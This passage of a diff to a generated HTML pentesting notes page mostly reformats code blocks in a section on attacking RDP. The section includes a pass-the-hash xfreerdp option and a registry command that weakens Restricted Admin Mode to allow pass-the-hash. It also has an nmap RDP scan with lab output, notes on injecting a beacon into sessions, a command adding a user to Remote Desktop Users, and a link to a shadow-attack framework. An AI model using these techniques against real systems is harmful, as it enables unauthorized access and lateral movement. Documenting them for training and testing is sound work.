+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2"></a># /pth:&lt;hash&gt;   Pass the hash
+</span></code></pre></div></td></tr></table></div>
 <p><strong>Trobleshooting</strong>: Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with an error. This can be enabled by adding a new registry key <code>DisableRestrictedAdmin</code> (REG_DWORD) under <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa</code> with the value of 0. It can be done using the following command:</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">reg</span> <span class="n">add</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">Lsa</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">v</span> <span class="n">DisableRestrictedAdmin</span> <span class="p">/</span><span class="n">d</span> <span class="n">0x0</span> <span class="p">/</span><span class="n">f</span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a><span class="n">reg</span> <span class="n">add</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">Lsa</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">v</span> <span class="n">DisableRestrictedAdmin</span> <span class="p">/</span><span class="n">d</span> <span class="n">0x0</span> <span class="p">/</span><span class="n">f</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access.</p>
 <h3 id="dos">DoS</h3>
 <p>To check the available encryption and DoS vulnerability (without causing DoS to the service) and obtains NTLM Windows info (versions).</p>
 <p>nmap uses RDPcookies (mstshash=nmap) to interact with the RDP server. These cookies can be identified by  security services such as EDRs, and can lock us out, so we need to think twice before running that scan.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>nmap<span class="w"> </span>-Pn<span class="w"> </span>-sV<span class="w"> </span>-p3389<span class="w"> </span>--script<span class="w"> </span>rdp-*<span class="w">  </span><span class="nv">$ip</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1"></a>nmap<span class="w"> </span>-Pn<span class="w"> </span>-sV<span class="w"> </span>-p3389<span class="w"> </span>--script<span class="w"> </span>rdp-*<span class="w">  </span><span class="nv">$ip</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Results:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>PORT     STATE SERVICE       VERSION
-</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>3389/tcp open  ms-wbt-server Microsoft Terminal Services
-</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>| rdp-enum-encryption:
-</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>|   Security layer
-</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>|     CredSSP (NLA): SUCCESS
-</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>|     CredSSP with Early User Auth: SUCCESS
-</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>|_    RDSTLS: SUCCESS
-</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>| rdp-ntlm-info:
-</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>|   Target_Name: EXPLOSION
-</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>|   NetBIOS_Domain_Name: EXPLOSION
-</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>|   NetBIOS_Computer_Name: EXPLOSION
-</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a>|   DNS_Domain_Name: Explosion
-</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a>|   DNS_Computer_Name: Explosion
-</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a>|   Product_Version: 10.0.17763
-</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a>|_  System_Time: 2022-11-11T12:16:26+00:00
-</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-</span></code></pre></div></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-23-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-23-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-23-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-23-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-23-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-23-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-23-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-23-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-23-10">10</a></span>
+<span class="normal"><a href="#__codelineno-23-11">11</a></span>
+<span class="normal"><a href="#__codelineno-23-12">12</a></span>
+<span class="normal"><a href="#__codelineno-23-13">13</a></span>
+<span class="normal"><a href="#__codelineno-23-14">14</a></span>
+<span class="normal"><a href="#__codelineno-23-15">15</a></span>
+<span class="normal"><a href="#__codelineno-23-16">16</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1"></a>PORT     STATE SERVICE       VERSION
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2"></a>3389/tcp open  ms-wbt-server Microsoft Terminal Services
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3"></a>| rdp-enum-encryption:
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4"></a>|   Security layer
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5"></a>|     CredSSP (NLA): SUCCESS
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6"></a>|     CredSSP with Early User Auth: SUCCESS
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7"></a>|_    RDSTLS: SUCCESS
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8"></a>| rdp-ntlm-info:
+</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9"></a>|   Target_Name: EXPLOSION
+</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10"></a>|   NetBIOS_Domain_Name: EXPLOSION
+</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11"></a>|   NetBIOS_Computer_Name: EXPLOSION
+</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12"></a>|   DNS_Domain_Name: Explosion
+</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13"></a>|   DNS_Computer_Name: Explosion
+</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14"></a>|   Product_Version: 10.0.17763
+</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15"></a>|_  System_Time: 2022-11-11T12:16:26+00:00
+</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16"></a>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></code></pre></div></td></tr></table></div></p>
 <h3 id="rdp-process-injection">RDP Process Injection</h3>
 <p>If someone from a different domain or with better privileges login via RDP to the PC where you are an Admin, you can inject your beacon in his RDP session process and act as him. </p>
 <h3 id="rdp-sessions-abuse">RDP Sessions Abuse</h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a># Adding User to RDP group
-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>net localgroup &quot;Remote Desktop Users&quot; UserLoginName /add
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1">1</a></span>
+<span class="normal"><a href="#__codelineno-24-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1"></a># Adding User to RDP group
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2"></a>net localgroup &quot;Remote Desktop Users&quot; UserLoginName /add
+</span></code></pre></div></td></tr></table></div>
 <h4 id="shadow-attack">Shadow Attack</h4>
 <p>AutoRDPwn is a post-exploitation framework created in Powershell, designed primarily to automate the Shadow attack on Microsoft Windows computers. This vulnerability (listed as a feature by Microsoft) allows a remote attacker to view his victim's desktop without his consent, and even control it on demand, using tools native to the operating system itself.</p>
 <p>https://github.com/JoelGMSec/AutoRDPwn</p>
@@ -17773,7 +17833,7 @@ Combining this technique with stickykeys or utilman you will be able to access a
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
